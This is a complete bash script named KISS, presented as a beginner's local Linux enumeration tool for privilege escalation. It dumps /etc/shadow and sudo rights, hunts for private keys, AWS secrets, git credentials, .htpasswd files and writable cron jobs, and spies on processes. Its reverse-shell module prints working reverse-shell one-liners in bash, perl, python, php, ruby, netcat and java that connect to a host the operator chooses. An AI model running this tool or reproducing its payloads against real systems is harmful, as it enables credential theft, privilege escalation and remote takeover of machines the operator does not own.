#!/bin/bash

COLOR=true
DEBUG=false
INFOBOX=false
TOUGH=false

function header() {

	echo ""
	if $COLOR; then
		echo -e "\033[96m$1\033[0m"
		echo -e "\033[96m============================================================\033[0m"
	else
		echo "$1"
		echo "============================================================"
	fi
	echo ""
}

function success() {

	if $COLOR; then
		echo -e "\033[92m[+]\033[0m $1"
	else
		echo "[+] $1"
	fi
}

function fail() {

	if $COLOR; then
		echo -e "\033[91m[-]\033[0m $1"
	else
		echo "[-] $1"
	fi
}

function warning() {

	if $COLOR; then
		echo -e "\033[93m[!]\033[0m $1"
	else
		echo "[!] $1"
	fi
}

function info() {

	if $COLOR; then
		echo -e "\033[94m[*]\033[0m $1"
	else
		echo "[*] $1"
	fi
}

function doted_line() {

	if $COLOR; then
		case $1 in
		green  ) echo -e "\033[92m------------------------------------------------------------\033[0m";;
		red    ) echo -e "\033[91m------------------------------------------------------------\033[0m";;
		yellow ) echo -e "\033[93m------------------------------------------------------------\033[0m";;
		blue   ) echo -e "\033[94m------------------------------------------------------------\033[0m";;
		*      ) echo "------------------------------------------------------------";;
	esac
	else
		echo "------------------------------------------------------------"
	fi
}

function info_box() {

	if $INFOBOX; then
		echo "+----------------------------------------------------------+"
		echo -n "| "
		for (( i = 1; i <= ${#1}; i++ )); do
			if [ $(($i%56)) == 0 ]; then
				echo "${1:$i-1:1} |"
				echo -n "| "
			else
				echo -n "${1:$i-1:1}"
			fi
		done
		for (( i = 0; i < 56 - $((${#1}%56)); i++ )); do
			echo -n " "
		done
		echo " |"
		echo "+----------------------------------------------------------+"
		echo ""
	fi
}

function overwrite() {
	for (( i = 0; i < $1; i++ )); do
		echo -en "\r\033[1A\033[0K"
	done
}

function title() {

	echo "############################################################"
	echo "#                 _  _______  _____ _____                  #"
	echo "#                | |/ /_   _|/ ____/ ____|                 #"
	echo "#                | ' /  | | | (___| (___                   #"
	echo "#                |  <   | |  \___ \\\\___ \                  #"
	echo "#                | . \ _| |_ ____) |___) |                 #"
	echo "#                |_|\_\_____|_____/_____/                  #"
	echo "#                                                          #"
	echo "#                        A Simple                          #"
	echo "#                   Linux Enumeration                      #"
	echo "#                         Script                           #"
	echo "#                                                          #"
	echo "############################################################"
}

function usage() {

	echo "Usage: $0 [OPTIONS]..." 
	echo ""
	echo "Description:"
	echo "  A simple local Linux enumeration script for beginners."
	echo "  Enable info boxes to see what each module does and get tips on what to look for."
	echo ""
	echo "Options:"
	echo "  --nocolor              Disable colors"
	echo "  -i, --info             Enable info boxes"
	echo "  -e, --export PATH      Enter a path for export"
	echo "  -d, --debug            Debug modus"
	echo "  -t, --tough          Enable tough mode (more checks)"
	echo "  -h, --help             Displays this help text"
}

function menu() {

	echo "  __  __                  "
	echo " |  \/  |                 "
 	echo " | \  / | ___ _ __  _   _ "
 	echo " | |\/| |/ _ \ '_ \| | | |"
 	echo " | |  | |  __/ | | | |_| |"
 	echo " |_|  |_|\___|_| |_|\__,_|"
	echo ""
	echo " What would you like to do next?"
	echo ""
	echo "  1)  Kernel, Operating System & Device Information"
	echo "  2)  Users & Groups"
	echo "  3)  User & Privilege Information"
	echo "  4)  Environmental Information"
	echo "  5)  Interesting Files"
	echo "  6)  Service Information"
	echo "  7)  Jobs/Tasks"
	echo "  8)  Networking, Routing & Communications"
	echo "  9)  Programs Installed"
	echo "  a)  Run all modules"
	echo "  p)  Spy on processes"
	echo "  s)  Search for a pattern in files with specified extensions"
	echo "  r)  Create a reverse shell in common languages"
	echo "  q)  Quit"	
	echo ""
	echo -n "Selection: "
	read -n 1 action
	echo ""
	overwrite 25
	case $action in
		1 ) run_module module_sys_info;;
		2 ) run_module module_users_groups;;
		3 ) run_module module_user_priv;;
		4 ) run_module module_env;;
		5 ) run_module module_files;;
		6 ) run_module module_services;;
		7 ) run_module module_jobs;;
		8 ) run_module module_network;;
		9 ) run_module module_software;;
		a ) run_all;;
		p ) run_module module_watch_processes --noexport;;
		s ) run_module module_search_files --noexport;;
		r ) run_module module_rev_shell --noexport;;
		q ) exit;;
		* ) fail "Invalid input!";;
	esac
}

function run_module() {

	if $DEBUG; then
		if [ "$2" = "--noexport" ]; then
			$1
		else
			$1 | tee -a $EXPORT
		fi
	else
		if [ "$2" = "--noexport" ]; then
			$1 2> /dev/null
		else
			$1 2> /dev/null | tee -a $EXPORT 2> /dev/null
		fi
	fi
}

function module_rev_shell() {

	header "Create a reverse shell in common languages"
	info_box "You can choose between several formats. Run \"Programs Installed\" first to see whats available."
	while true; do
		echo -n "Host: "
		read host
		echo -n "Port: "
		read port
		if ! [ -z "$port" ] && [ "$port" -eq "$port" ]; then
			break
		else
			fail "Not a valid port number!"
		fi
		if ! [ -z "$host" ] && [[ $host =~ ^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$ ]]; then
			break
		else
			fail "Not an ip address!"
		fi

		echo "Press <q> to quit"
		read -n 1 -s -t 5 quit
		if [ "$quit" = "q" ]; then
			return
		fi
	done

	echo ""
	echo "What kind of format would you like to have?"
	echo ""
	echo "  1)  Bash"	
	echo "  2)  Perl"	
	echo "  3)  Python"	
	echo "  4)  Php"	
	echo "  5)  Ruby"	
	echo "  6)  Netcat"	
	echo "  7)  java"	
	echo "  q)  Quit"	
	echo ""

	while true; do

		echo -n "Selection: "
		read -n 1 format
		echo ""
		doted_line blue
		case $format in
			1 ) echo "bash -i >& /dev/tcp/$host/$port 0>&1";;
			2 ) echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";;
			3 ) echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";;
			4 ) echo "php -r '$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";;
			5 ) echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";;
			6 ) echo "nc -e /bin/sh $host $port";;
			7 ) echo "r = Runtime.getRuntime()"
				echo "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$host/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])"
				echo "p.waitFor()"
				;;
			q ) return;;
			* ) fail "Invalid input!";;
		esac
		doted_line blue
	done
}

function module_search_files() {

	header "Search for a pattern in files with specified extensions"
	info_box "It would be useful to search in files with following extensions: .ini, .conf, .json, .xml, .php"

	while true; do
		echo -n "File extensions to look for (Separated by comma): "
		read ext
		echo -n "Directory depth (default: 5): "
		read depth
		echo -n "Pattern to search for (Regex): "
		read pattern
		if ! [ -z "$ext" ] && [[ $ext =~ ^([a-zA-Z0-9]+\,)?[a-zA-Z0-9]+$ ]]; then
			break
		else
			fail "Bad extensions!"
		fi
		if ! [ -z "$depth" ] && [ "$depth" -eq "$depth" ]; then
			break
		else
			fail "Not a valid depth number!"
		fi
		if ! [ -z "$pattern" ]; then
			break
		else
			fail "You have to provide a pattern!"
		fi

		echo "Press <q> to quit"
		read -n 1 -s -t 5 quit
		if [ "$quit" = "q" ]; then
			return
		fi
	done

	regex=".*\\.\\($(echo $ext | sed 's/,/\\\|/g')\\)\$"
	search=$(find / -maxdepth ${depth:-5} -iregex $regex -type f -exec grep -Hne $pattern {} \;)

	echo ""
	if [ "$search" ]; then
		success "The search resulted in the following hits"
		doted_line green
		echo "$search"
	else
		fail "Nothing found"
	fi
}

function module_watch_processes() {

	header "Spy on processes"
	info_box "This module attempts to capture processes that are executed by a particular user or all of them if none is set. It is also possible to set the interval timer. How does it work? We scan /proc to see if a new process has emerged. Keep in mind that this may take some cpu time."

	while true; do
		echo -n "UID to look for (empty for all): "
		read uid
		echo -n "Time (s) between scans (empty for 0.1s): "
		read interval
		
		if [ -z "$uid" ] || [ "$uid" -eq "$uid" ]  && [ -z "$interval" ] || [[ $interval =~ ^[0-9]+\.?[0-9]*$ ]] ; then
			break
		fi

		fail "Not a valid number!"
		echo "Press <q> to quit"
		read -n 1 -s -t 5 quit
		if [ "$quit" = "q" ]; then
			return
		fi
	done
	
	echo 	"+-----------------------+---------------+---------------------------------------+---------------------------------------+----------------------------------+"
	echo -e "|          TIME         |      PID      |  UID:  real  eff  saved_set filesys   |  GID:  real  eff  saved_set filesys   |              CMD                 |"
	echo 	"+-----------------------+---------------+---------------------------------------+---------------------------------------+----------------------------------+"

	declare -A watched

	while true; do
		for ps in /proc/[0-9]*/; do
			if [ ! -z ${watched[$ps]} ] || [ ! -e ${ps}cmdline ] || [ "$(grep -e "^Uid:\s*$uid" ${ps}status)" = "" ]; then
				continue
			fi
			IFS= read -r -d '' cmd <${ps}cmdline || [[ $cmd ]]
			echo -e "|  $(date +"%D - %T")\t|  $(grep -e "^Pid:" ${ps}status)\t|  $(grep -e "^Uid:" ${ps}status)\t|  $(grep -e "^Gid:" ${ps}status)\t|  $cmd"
			watched[$ps]=true
		done
		read -n 1 -s -t 0.00001 quit 
		if [ "$quit" = "q" ]; then
			return
		fi
		sleep ${interval:-0.1}
	done
}

function module_sys_info() {

	header "Kernel, Operating System & Device Information"
	info_box "bla"

	unamea=$(uname -a)
	if [ "$unamea" ]; then
		info "System information:"
		doted_line blue
	  	echo "$unamea"
	  	echo ""
	fi
	
	procversion=$(cat /proc/version)
	if [ "$procversion" ]; then
		info "Kernel information"
		doted_line blue
	  	echo "$procversion" 
	  	echo ""
	fi

	release=$(cat /etc/*-release)
	if [ "$release" ]; then
		info "Distribution information"
		doted_line blue
		echo "$release"
	  	echo ""
	fi

	if $TOUGH; then

		cpuinfo=$(cat /proc/cpuinfo)
		if [ "$cpuinfo" ]; then
			info "CPU information"
			doted_line blue
			echo "$cpuinfo"
		  	echo ""
		fi

		filesys=$(df -a)
		if [ "$filesys" ]; then
			info "File system information"
			doted_line blue
			echo "$filesys"
		  	echo ""
		fi
	else
		warning "Skipped: CPU information"
		warning "Skipped: File system information"
		info "To see skipped Checks start this script with -t"
	fi
}

function module_users_groups() {

	header "Users & Groups"
	info_box "List all users as well as groups on the system."

	users=$(cat /etc/passwd)
	if [ "$users" ]; then
		info "All users on the system"
		doted_line blue
		info_box "On older systems password hashes lie in /etc/passwd."
		echo "$users"
	  	echo ""
	fi

	groups=$(cat /etc/groups)
	if [ "$groups" ]; then
		info "All groups on the system"
		doted_line blue
		echo "$groups"
	  	echo ""
	fi

	memberships=$(for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done)
	if [ "$memberships" ]; then
		info "All uid’s and respective group memberships"
		doted_line blue
		echo "$memberships"
	  	echo ""
	fi

	shadow=$(cat /etc/shadow)
	if [ "$shadow" ]; then
		success "Users password hashes"
		doted_line green
		echo "$shadow"
	  	echo ""
	fi

	masterpasswd=$(cat /etc/master.passwd)
	if [ "$masterpasswd" ]; then
		success "The master.passwd file"
		doted_line green
		echo "$masterpasswd"
	  	echo ""
	fi

	superusers=$(grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}')
	if [ "$superusers" ]; then
		info "Super users"
		doted_line blue
		echo "$superusers"
	  	echo ""
	fi

	who=$(w)
	if [ "$who" ]; then
		info "All logged in users"
		doted_line blue
		echo "$who"
	  	echo ""
	fi

	last=$(last)
	if [ "$last" ]; then
		info "Listing of last logged on users"
		doted_line blue
		echo "$last"
	  	echo ""
	fi
}

function module_user_priv() {

	header "User & Privilege Information"
	info_box "Gathers information about the current user you are logged in. Checks if some actions can be performed as root."

	self=$(id)
	whoami=$(whoami)
	if [ "$self" ] && [ "$whoami" ]; then
		info "Who am I and if so how many?"
		doted_line blue
		echo "$whoami $self"
	  	echo ""
	fi

	sudoers=$(grep -v -e '^$' /etc/sudoers |grep -v "#")
	if [ "$sudoers" ]; then
		info "Sudoers configuration file"
		doted_line blue
		echo "$sudoers"
	  	echo ""
	fi

	sudol=$(sudo -l)
	if [ "$sudol" ]; then
		success "The current user can do something as root"
		doted_line green
		echo "$sudol"
	  	echo ""
	fi
}

function module_env() {

	header "Environmental Information"
	info_box "Lists a few environmental variables to. It's useful to see what you can work with. "

	env=$(env)
	if [ "$env" ]; then
		info "Environmental variables"
		doted_line blue
		echo "$env"
	  	echo ""
	fi

	history=$(history)
	if [ "$history" ]; then
		info "Command history of current user"
		doted_line blue
		echo "$history"
	  	echo ""
	fi

	sestatus=$(sestatus)
	if [ "$sestatus" ]; then
		fail "Running under SELinux"
		doted_line red
		info_box "SELinux is a set of kernel modifications and user-space tools that have been added to various Linux distributions. Its architecture strives to separate enforcement of security decisions from the security policy, and streamlines the amount of software involved with security policy enforcement."
		echo "$sestatus"
	  	echo ""
	fi

	shells=$(cat /etc/shells)
	if [ "$shells" ]; then
		info "Available shells"
		doted_line blue
		echo "$shells"
	  	echo ""
	fi

	umask=$(umask -S)
	if [ "$umask" ]; then
		info "Umask"
		doted_line blue
		info_box "In computing, umask is a command that determines the settings of a mask that controls how file permissions are set for newly created files. It may also affects how the file permissions are changed explicitly."
		echo "$umask"
	  	echo ""
	fi

	pwpolicy=$(grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs)
	if [ "$pwpolicy" ]; then
		info "Password policy"
		doted_line blue
		echo "$pwpolicy"
	  	echo ""
	fi

	indocker=$(grep -i docker /proc/self/cgroup; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null)
	if [ "$indocker" ]; then
		warning "We are in a docker container"
		doted_line yellow
		echo "$indocker"
	  	echo ""
	fi

	inlxd=$(grep -qa container=lxc /proc/1/environ)
	if [ "$inlxd" ]; then
		warning "We are in a lxd container"
		doted_line yellow
		echo "$inlxd"
	  	echo ""
	fi

	invm=$(dmesg | grep "Hypervisor detected" | awk -F'] ' '{ print $2}')
	if [ "$invm" ]; then
		warning "We are in a virtual machine"
		doted_line yellow
		echo "$invm"
	  	echo ""
	fi
}

function module_files() {

	header "Interesting Files"
	info_box "Let's see if we can find some interesting files that contain credentials or other information. It is also useful to search for writable directories in case a highly privileged user executes a file located in one of them."

	history=$(history)
	if [ "$history" ]; then
		info "Command history of current user"
		doted_line blue
		echo "$history"
	  	echo ""
	fi

	roothome=$(ls -la /root/)
	if [ "$roothome" ]; then
	  success "Root's home directory"
	  doted_line green
	  echo "$roothome" 
	  echo ""
	fi

	usershome=$(ls -la /home/)
	if [ "$usershome" ]; then
		info "Home directory"
		doted_line blue
		echo "$usershome" 
		echo ""
	fi

	suid=$(find / -perm -4000 -type f -exec ls -la {} \;)
	if [ "$suid" ]; then
		info "SUID files"
		doted_line blue
		echo "$suid" 
		echo ""
	fi

	sgid=$(find / -perm -2000 -type f -exec ls -la {} \;)
	if [ "$sgid" ]; then
		info "SGID files"
		doted_line blue
		echo "$sgid" 
		echo ""
	fi

	capa=$(grep -v '^#\|none\|^$' /etc/security/capability.conf)
	if [ "$capa" ]; then
		info "Capability configuration file"
		doted_line blue
		echo "$capa" 
		echo ""
	fi

	hosteq=$(find /etc -iname hosts.equiv -exec ls -la {} \; -exec cat {} \;)
	if [ "$hosteq" ]; then
		info "Host.equiv file"
		doted_line blue
		echo "$hosteq" 
		echo ""
	fi

	fstab=$(cat /etc/fstab)
	if [ "$fstab" ]; then
		info "Fstab file is accessible"
		doted_line blue
		echo "$fstab" 
		echo ""
	fi

	conf=$(find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \;)
	if [ "$conf" ]; then
		info "Configuration files in /etc/"
		doted_line blue
		echo "$conf" 
		echo ""
	fi

	usershistory=$(ls -la /home/*/.*_history)
	if [ "$usershistory" ]; then
		info "History files in /home"
		doted_line blue
		echo "$usershistory" 
		echo ""
	fi

	roothistory=$(ls -la /root/.*_history)
	if [ "$roothistory" ]; then
		success "Root's history files"
		doted_line green
		echo "$roothistory" 
		echo ""
	fi

	if $TOUGH; then

		home=$(ls -la ~)
		if [ "$home" ]; then
			info "$HOME files"
			doted_line blue
			echo "$home" 
			echo ""
		fi

		ownfiles=$(find / -user $(whoami) -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \;)
		if [ "$ownfiles" ]; then
			info "Files that you own"
			doted_line blue
			echo "$ownfiles" 
			echo ""
		fi
		
		wgrpfiles=$(find / -writable ! -user $(whoami) -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \;)
		if [ "$wgrpfiles" ]; then
			info "Writable files by group"
			doted_line blue
			echo "$wgrpfiles" 
			echo ""
		fi

		hiddenfiles=$(find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \;)
		if [ "$hiddenfiles" ]; then
			info "Hidden files"
			doted_line blue
			echo "$hiddenfiles" 
			echo ""
		fi

		rhomefiles=$(find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \;)
		if [ "$rhomefiles" ]; then
			info "Readable files in /home directory"
			doted_line blue
			echo "$rhomefiles" 
			echo ""
		fi
		
		keyfiles=$(grep -rlie "(PRIVATE KEY|aws_secret_access_key)" /home)
		if [ "$keyfiles" ]; then
			success "Sensitive key files found"
			doted_line green
			echo "$keyfiles" 
			echo ""
		fi

		gitcredfiles=$(find / -name ".git-credentials")
		if [ "$gitcredfiles" ]; then
			success "Found git credential file"
			doted_line green
			echo "$gitcredfiles" 
			echo ""
		fi

		wwfiles=$(find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} \;)
		if [ "$wwfiles" ]; then
			info "World writable files"
			doted_line blue
			echo "$wwfiles" 
			echo ""
		fi

		readmail=$(ls -la /var/mail)
		if [ "$readmail" ]; then
			info "E-Mail Box"
			doted_line blue
			echo "$readmail" 
			echo ""
		fi

	else
		warning "Skipped: $HOME files"
		warning "Skipped: Files that you own"
		warning "Skipped: Writable files by group"
		warning "Skipped: Hidden files"
		warning "Skipped: Readable files in /home directory"
		warning "Skipped: Sensitive key files found"
		warning "Skipped: Found git credential file"
		warning "Skipped: World writable files"
		warning "Skipped: E-Mail Box"
		info "To see skipped Checks start this script with -t"
	fi
}

function module_services() {

	header "Service Information"
	info_box "View running services as well as some configuration information. Look out for services that run under root. It's always wise to look for cross-references: Are there any service/processes you can manipulate by changing files you have access to?"

	psauxf=$(ps auxf)
	if [ "$psauxf" ]; then
		info "Running processes"
		doted_line blue
		echo "$psauxf" 
		echo ""
	fi

	psbinperm=$(ps aux | awk '{print $11}' | xargs -r ls -la | awk '!x[$0]++')
	if [ "$psbinperm" ]; then
		info "Process binary path and permissions"
		doted_line blue
		echo "$psbinperm" 
		echo ""
	fi

	inetdconf=$(cat /etc/inetd.conf)
	if [ "$inetdconf" ]; then
		info "List services managed by inetd"
		doted_line blue
		echo "$inetdconf" 
		echo ""
	fi

	xinetdconf=$(cat /etc/xinetd.conf)
	if [ "$inetdconf" ]; then
		info "List services managed by xinetd"
		doted_line blue
		echo "$inetdconf" 
		echo ""
	fi

	xinetdbinperm=$(cat /etc/xinetd.conf | awk '{print $7}' | xargs -r ls -la)
	if [ "$xinetdbinperm" ]; then
		info "List associated binaries and permissions of services managed by xinetd"
		doted_line blue
		echo "$xinetdbinperm" 
		echo ""
	fi

	initdperm=$(ls -la /etc/init.d)
	if [ "$initdperm" ]; then
		info "Permissions /etc/init.d/"
		doted_line blue
		echo "$initdperm" 
		echo ""
	fi

	rcdperm=$(ls -la /etc/rc.d/init.d)
	if [ "$rcdperm" ]; then
		info "Permissions /etc/rc.d/init.d"
		doted_line blue
		echo "$rcdperm" 
		echo ""
	fi

	lrcperm=$(ls -la /usr/local/etc/rc.d)
	if [ "$lrcperm" ]; then
		info "Permissions /usr/local/etc/rc.d"
		doted_line blue
		echo "$lrcperm" 
		echo ""
	fi

	initperm=$(ls -la /etc/init/)
	if [ "$initperm" ]; then
		info "Permissions /etc/init/"
		doted_line blue
		echo "$initperm" 
		echo ""
	fi

	systemdperm=$(ls -la /lib/systemd/)
	if [ "$systemdperm" ]; then
		info "Permissions /lib/systemd/"
		doted_line blue
		echo "$systemdperm" 
		echo ""
	fi

	nfs=$(ls -la /etc/exports; cat /etc/exports)
	if [ "$nfs" ]; then
		info "NFS exports configuration file"
		doted_line blue
		info_box "NFS access restriction up to v4 is pretty useless. You might be able to mount a share on your local machine and fake some UIDs."
		echo "$nfs" 
		echo ""
	fi

	if $TOUGH; then

		services=$(cat /etc/services)
		if [ "$services" ]; then
			info "Service mapping"
			doted_line blue
			echo "$services"
			echo ""
		fi
	else
		warning "Skipped: Service mapping"
		info "To see skipped Checks start this script with -t"
	fi
}

function module_jobs() {

	header "Jobs/Tasks"
	info_box "List repeating tasks. See if a task can be manipulated, directly or indirectly."

	cronjobs=$(ls -la /etc/cron*)
	if [ "$cronjobs" ]; then
		info "Cron jobs"
		doted_line blue
		echo "$cronjobs"
		echo ""
	fi

	wwcronjobs=$(find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;)
	if [ "$wwcronjobs" ]; then
		success "Cron jobs that are world writable"
		doted_line green
		echo "$wwcronjobs"
		echo ""
	fi

	crontab=$(cat /etc/crontab)
	if [ "$crontab" ]; then
		info "Crontab"
		doted_line blue
		echo "$crontab"
		echo ""
	fi

	anacrontab=$(ls -la /etc/anacrontab; cat /etc/anacrontab)
	if [ "$anacrontab" ]; then
		info "Anacrontabs and permissions"
		doted_line blue
		echo "$anacrontab"
		echo ""
	fi
}

function module_network() {

	header "Networking, Routing & Communications"
	info_box "List network interfaces, route information and open TCP/UDP sockets"
	
	ifconfig=$(ifconfig -a)
	ip=$(ip a)
	if [ "$ifconfig" ]; then
		info "Network interfaces"
		doted_line blue
		echo "$ifconfig"
		echo ""
	elif [ "$ip" ]; then
		info "Network interfaces"
		doted_line blue
		echo "$ip"
		echo ""
	fi

	arp=$(arp -a)
	iparp=$(ip n)
	if [ "$arp" ]; then
		info "ARP information"
		doted_line blue
		echo "$arp"
		echo ""
	elif [ "$iparp" ]; then
		info "ARP information"
		doted_line blue
		echo "$iparp"
		echo ""
	fi

	route=$(route)
	ipr=$(ip r)
	if [ "$route" ]; then
		info "Route information"
		doted_line blue
		echo "$route"
		echo ""
	elif [ "$ipr" ]; then
		info "Route information"
		doted_line blue
		echo "$ipr"
		echo ""
	fi

	netstat=$(netstat -tulpn)
	ss=$(ss -tulpn)
	if [ "$netstat" ]; then
		info "Listening TCP/UDP sockets and related PIDs"
		doted_line blue
		echo "$netstat"
		echo ""
	elif [ "$ss" ]; then
		info "Listening TCP/UDP sockets and related PIDs"
		doted_line blue
		echo "$ss"
		echo ""
	fi

	dns=$(cat /etc/resolve.conf)
	if [ "$dns" ]; then
		info "Configured DNS sever addresses"
		doted_line blue
		echo "$dns"
		echo ""
	fi

	iptables=$(iptables -L)
	if [ "$iptables" ]; then
		info "Ip table rules"
		doted_line blue
		echo "$iptables"
		echo ""
	fi
}

function module_software() {

	header "Programs Installed"
	info_box "List useful binaries and other installed programs and their versions. You should take a look at outdated software."

	binaries='nmap gcc perl awk find bash sh man more less vi emacs vim nc netcat python ruby lua irb tar zip gdb pico scp git rvim script ash csh curl dash ed env expect ftp sftp node php rpm rpmquery socat strace taskset tclsh telnet tftp wget wish zsh ssh$ ip$ arp mtr'
	info "Good to know binaries"
	doted_line blue
	for binary in $binaries; do
		location=$(which $binary)

		if [ "$location" ]; then
			echo "$location"
		fi
	done
	echo ""

	sudover=$(sudo -V | grep 'version')
	if [ "$sudover" ]; then
		info "Sudo version"
		doted_line blue
		echo "$sudover"
		echo ""
	fi

	mysqlver=$(mysql --version)
	if [ "$mysqlver" ]; then
		info "MYSQL version"
		doted_line blue
		echo "$mysqlver"
		echo ""
	fi

	postgver=$(psql -V)
	if [ "$postgver" ]; then
		info "Postgres version"
		doted_line blue
		echo "$postgver"
		echo ""
	fi

	apachever=$(apache2 -v; httpd -v)
	if [ "$apachever" ]; then
		info "Apache version"
		doted_line blue
		echo "$apachever"
		echo ""

		apacheusr=$(grep -i 'user\|group' /etc/apache2/envvars | awk '{sub(/.*\export /,"")}1')
		if [ "$apacheusr" ]; then
			info "Apache user configuration file"
			echo "$apacheusr"
			echo ""
		fi

		apachemodules=$(apache2ctl -M; httpd -M)
		if [ "$apachemodules" ]; then
			info "Apache modules"
			doted_line blue
			echo "$apachemodules"
			echo ""
		fi
	fi

	htpasswd=$(find / -name .htpasswd -print -exec cat {} \;)
	if [ "$htpasswd" ]; then
		info ".htpasswd file"
		doted_line blue
		echo "$htpasswd"
		echo ""
	fi

	compilers=$(dpkg --list | grep compiler | grep -v decompiler && yum list installed 'gcc*' | grep gcc)
	if [ "$compilers" ]; then
		info "List available compilers"
		doted_line blue
		echo "$compilers"
		echo ""
	fi

	if $TOUGH; then

		dpkg=$(dpkg -l)
		rpm=$(rpm -qa)
		if [ "$dpkg" ]; then
			info "Installed packages (Debian)"
			doted_line blue
			echo "$dpkg"
			echo ""
		elif [ "$rpm" ]; then
			info "Installed packages (Red Hat)"
			doted_line blue
			echo "$rpm"
			echo ""
		fi
	else
		warning "Skipped: Installed packages (all)"
		info "To see skipped Checks start this script with -t"
	fi

}

function run_all() {
	run_module module_sys_info
	run_module module_users_groups
	run_module module_user_priv
	run_module module_env
	run_module module_files
	run_module module_services
	run_module module_jobs
	run_module module_network
	run_module module_software
}

##### Main #####
while [ "$1" != "" ]; do
    case $1 in
        --nocolor ) shift; COLOR=false;;
        -i | --info ) shift; INFOBOX=true;;
        -e | --export ) shift; EXPORT=$1; shift;;
        -d | --debug ) shift; DEBUG=true;;
        -t | --tough ) shift; TOUGH=true;;
        -h | --help ) usage; exit;;
        * ) usage; exit 1
    esac
done

run_module title

##### Menu #####
while true; do
	menu
	echo ""
	doted_line yellow
	warning "Press any key to continue or <q> to quit"
	doted_line yellow
	read -n 1 -s pressed
	echo ""
	overwrite 4
	if [ "$pressed" = "q" ]; then
		exit
	fi
done
